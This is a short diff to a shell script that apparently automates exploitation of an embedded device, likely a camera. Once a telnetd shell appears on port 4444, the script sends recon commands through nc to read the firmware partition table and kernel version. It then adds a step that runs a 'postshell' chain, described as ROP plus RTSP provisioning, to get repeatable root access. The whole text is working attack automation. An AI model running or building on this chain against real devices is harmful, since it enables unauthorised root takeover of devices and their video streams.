@@ -102,6 +102,11 @@ while :; do
       (printf 'id\n'; sleep 2; printf 'cat /proc/mtd\n'; sleep 2; printf 'cat /proc/version\n'; sleep 2) | \
         timeout 12 nc "$ip" 4444 >"/tmp/pane1/$ip/recon_telnetd.txt" 2>/dev/null
       log "FOUND — telnetd up on $ip:4444, recon $(wc -c <"/tmp/pane1/$ip/recon_telnetd.txt" 2>/dev/null) bytes at /tmp/pane1/$ip/recon_telnetd.txt"
+      # convert the shell immediately: repeatable ROP + RTSP (c660_postshell waits on :4444 itself)
+      log "running postshell chain on $ip"
+      sudo -n bash "$HERE/c660_postshell.sh" "$ip" >>"$LOG" 2>&1 \
+        && log "postshell chain OK — repeatable root + RTSP provisioned" \
+        || log "postshell chain FAILED (see $LOG lines above); telnetd still on $ip:4444 for manual retry"
       phase DONE
       exit 0
     fi
